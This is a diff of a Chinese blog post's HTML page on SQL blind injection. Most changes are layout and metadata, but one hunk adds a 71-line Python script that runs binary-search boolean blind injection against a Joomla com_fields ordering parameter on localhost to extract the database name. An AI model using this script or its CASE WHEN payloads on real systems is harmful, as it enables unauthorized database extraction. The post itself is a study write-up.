@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fs8ge0tid7j316g0fcmy0.jpg">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fs8ghvs1vij30lo0dm0tv.jpg">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fs8h4y3tdbj317q098dgh.jpg">
-<meta property="og:updated_time" content="2018-06-14T09:41:29.043Z">
+<meta property="og:updated_time" content="2018-06-15T07:35:18.904Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈SQL盲注">
 <meta name="twitter:description" content="总结一下自己应对SQL Injection盲注的姿势与和对原理的理解。">
@@ -269,35 +269,35 @@
   
   <div class="article-inner">
     
-  
-    <header class="article-header">
-      
+    
+      <header class="article-header">
+        
   
     <h1 class="article-title" itemprop="name">
       浅谈SQL盲注
     </h1>
   
 
+        
+      </header>
       
-    </header>
-    
-    <div class="article-info article-info-post">
-      
-      
+      <div class="article-info article-info-post">
+        
+        
     <div class="article-category tagcloud">
     <a class="article-category-link" href="/categories/Study/">Study</a>
     </div>
 
 
-      
+        
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-Injection/">SQL Injection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li></ul>
     </div>
 
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+      </div>
+      
     
-  
     <div class="article-entry" itemprop="articleBody">
       
           
@@ -327,7 +327,7 @@
 </blockquote>
 <p>最后只需要将手工测试的过程转换成python用代码自动化实现</p>
 <h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>直接上代码吧</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备工作</span></span><br><span class="line">url = <span class="string">'http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]='</span></span><br><span class="line">string = <span class="string">'0123456789ABCDEFGHIGHLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">cookies = &#123;<span class="string">'9e44025326f96e2d9dc1a2aab2dbe5b1'</span> : <span class="string">'l1p92lf44gi4s7jdf5q73l0bt5'</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (ascii(substr((select database()),1,1)) &gt; 78) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)'</span>,cookies=cookies,timeout=<span class="number">2</span>)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="comment"># 二分法</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">7</span>:</span><br><span class="line">	left = <span class="number">0</span></span><br><span class="line">	right = len(string) - <span class="number">1</span></span><br><span class="line">	mid = int((left + right) / <span class="number">2</span>)</span><br><span class="line">	print(<span class="string">'\n'</span>)</span><br><span class="line">	print(flag)</span><br><span class="line">	print(<span class="string">'Testing... '</span> + str(left) + <span class="string">' '</span> + str(right))</span><br><span class="line">	<span class="comment"># 特殊情况</span></span><br><span class="line">	<span class="keyword">if</span> (right - left) == <span class="number">1</span>:</span><br><span class="line">		payload = <span class="string">"(CASE WHEN (ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)"</span>.format(i, str(ord(string[left])))</span><br><span class="line">		poc = url + payload</span><br><span class="line">		print(poc)</span><br><span class="line">		response = requests.get(poc,cookies=cookies,timout=<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">'安全令牌无效'</span>) <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = flag + string[right]</span><br><span class="line">			print(flag)</span><br><span class="line">			exit()</span><br><span class="line">		<span class="keyword">else</span>: </span><br><span class="line">			flag = flag + string[left]</span><br><span class="line">			print(flag)</span><br><span class="line">			exit()</span><br><span class="line">	<span class="comment"># 二分法</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		mid = int((left + right) / <span class="number">2</span>)</span><br><span class="line">		payload = <span class="string">"(CASE WHEN (ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)"</span>.format(i, str(ord(string[mid])))</span><br><span class="line">		poc = url + payload</span><br><span class="line">		print(poc)</span><br><span class="line">		response = requests.get(poc,cookies=cookies,timeout=<span class="number">2</span>)</span><br><span class="line">		<span class="comment"># 右半部</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="string">'安全令牌无效'</span>) <span class="keyword">in</span> response.text:</span><br><span class="line">			left = mid + <span class="number">1</span></span><br><span class="line">			print(<span class="string">'left:'</span>+str(left))</span><br><span class="line">		<span class="comment"># 左半部</span></span><br><span class="line">		<span class="keyword">else</span>: </span><br><span class="line">			right = mid</span><br><span class="line">			print(<span class="string">'right:'</span>+str(right))</span><br><span class="line">		<span class="keyword">if</span> (left == right):</span><br><span class="line">			flag = flag + string[left]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="comment"># 特殊情况</span></span><br><span class="line">		<span class="keyword">if</span> (right - left) == <span class="number">1</span>:</span><br><span class="line">			payload = <span class="string">"(CASE WHEN (ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)"</span>.format(i, str(ord(string[mid])))</span><br><span class="line">			poc = url + payload</span><br><span class="line">			print(poc)</span><br><span class="line">			response = requests.get(poc,cookies=cookies,timeout=<span class="number">2</span>)</span><br><span class="line">			<span class="keyword">if</span> (<span class="string">'安全令牌无效'</span>) <span class="keyword">in</span> response.text:</span><br><span class="line">				flag = flag + string[right]</span><br><span class="line">				print(flag)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>: </span><br><span class="line">				flag = flag + string[left]</span><br><span class="line">				print(flag)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 <h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><p><strong>优点：</strong></p>
 <ol>
 <li>简单，不需要像二分法一样繁琐地一个个遍历</li>
@@ -424,8 +424,10 @@
     <div class="copyright">
         <p><span>Title:</span><a href="/2018/04/05/sql-blind/">浅谈SQL盲注</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
+        <p><span class="post-count">Words:</span>2,275</p>
+        <p><span class="post-count">Time:</span>11 mins</p>
         <p><span>Created:</span>2018-04-05, 21:55:48</p>
-        <p><span>Updated:</span>2018-06-14, 17:41:29</p>
+        <p><span>Updated:</span>2018-06-15, 15:35:18</p>
         <p>
             <span>Full URL:</span><a class="post-url" href="/2018/04/05/sql-blind/" title="浅谈SQL盲注">http://blog.karmaof.me/2018/04/05/sql-blind/</a>
             <span class="copy-path" data-clipboard-text="From http://blog.karmaof.me/2018/04/05/sql-blind/　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
@@ -455,6 +457,7 @@
         
     </nav>
 
+  
   
 </article>
 
@@ -510,10 +513,11 @@
 
 
 
-    
-        <!-- 来必力City版安装代码 -->
-<div id="lv-container" data-id="city" data-uid="MTAyMC8zNzM1NC8xMzg4OA==">
-	<script type="text/javascript">
+        
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDM3Ny8xMDkxNA==">
+    <script type="text/javascript">
    (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
 
@@ -524,11 +528,12 @@
        j.async = true;
 
        e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
-</div>
-<!-- City版安装代码已完成 -->
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>
     
 
 
@@ -567,9 +572,8 @@
                 2017-2018 KarmA
             </div>
             <div id="footer_right_div" class="footer-right" style="text-align:center;overflow:hidden;">
-                <div id="id_keep_div" style="display:inline;"><span class="my-face" style="vertical-align:middle;">
-
-                     Follow Your Heart.
+                <div id="web_count_div" class="post-count-bottom" style="display:inline;">
+                    Follow Your Heart.
                     <i class="fa fa-heart animated infinite pulse" style="color:red;margin-left:2px;"></i><!-- 红心-->
                 </div>
             </div>
@@ -591,17 +595,14 @@
                         </span>
                     </span>
                     <span>| </span>
-                    <span title="All Words">
+                    <span title="本站总字数统计">
                          <span><i class="fa fa-map" aria-hidden="true"></i></span>
-                         <span class="post-count"><b>75.9k</b></span>
+                        <span class="post-count"><b>76.3k</b></span>
                     </span>
                 
-
             </div>
         
-        </br>
         
-
     </div>
 </footer>
     </div>
